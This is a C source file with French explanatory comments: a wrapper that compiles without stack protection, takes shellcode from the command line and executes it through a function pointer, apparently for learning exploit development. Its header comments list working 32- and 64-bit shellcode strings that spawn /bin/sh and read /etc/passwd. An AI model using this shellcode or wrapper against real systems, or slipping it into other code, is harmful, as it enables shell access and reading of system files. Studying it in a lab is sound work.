// Author : Alexandre GRAU
// Compilation : gcc -fno-stack-protector -z execstack -m32 wrapper.c -o wrapper32
// Compilation : gcc -fno-stack-protector -z execstack -m64 wrapper.c -o wrapper64
// Execution : ./wrapper32 $(python2 -c 'print("<shellcode32>")')
// Execution : ./wrapper64 $(python2 -c 'print("<shellcode64>")')

// shellcodes 32bits :
// execve("/bin/sh") : "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
// execve("cat /etc/passwd") : "\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80"

// shellcodes 64bits :
// execve("/bin/sh") : "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

// Un pointeur c'est une variable qui pointe vers un emplacement mémoire.

// Lorsque l'on exécute une fonction on jump sur l'emplacement mémoire de la
// fonction et le programme commence à exécuter les instructions contenue.

// int (*func)() déclare func comme un pointeur de fonction.
// (int(*)()) caste la variable qui suit comme une fonction sans arguments qui
// retourne un int.
// int(*func)() = (int(*)())argv[1] affecte l'emplacement mémoire du shellcode
// passé en argument au wrapper en pointeur de fonction func.
// func(); appelle la fonction pointée par func, qui est enfait le shellcode.

// L'interprétation d'un bloc de mémoire comme une fonction est dangereuse
// (et normalement impossible sans les options de compilation
// -fno-stack-protector et -z execstack), car il n'y a pas de vérification que
// la mémoire contient bien des instructions valides ou non.
// Attention de bien comprend ce que fait le shellcode avant de l'exécuter.

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
  // Controle du nombre d'arguments
  if (argc < 2) {
    printf("Usage: %s <shellcode>\n", argv[0]);
    return 1;
  }
  
  char *shellcode = argv[1];
  
  // Affichage de la taille du shellcode
  size_t shellcode_len = strlen(shellcode);
  printf("Shellcode size: %ld\n", shellcode_len);

  // Affichage du shellcode
  printf("Shellcode: ");
  for (size_t i = 0; i < shellcode_len; i++) {
    printf("\\x%02x", (unsigned char)shellcode[i]);
  }
  printf("\n");

  // Execution du shellcode
  printf("Executing shellcode...\n");
  int (*func)();
  func = (int (*)()) shellcode;
  (int)(*func)();

  return 0;
}
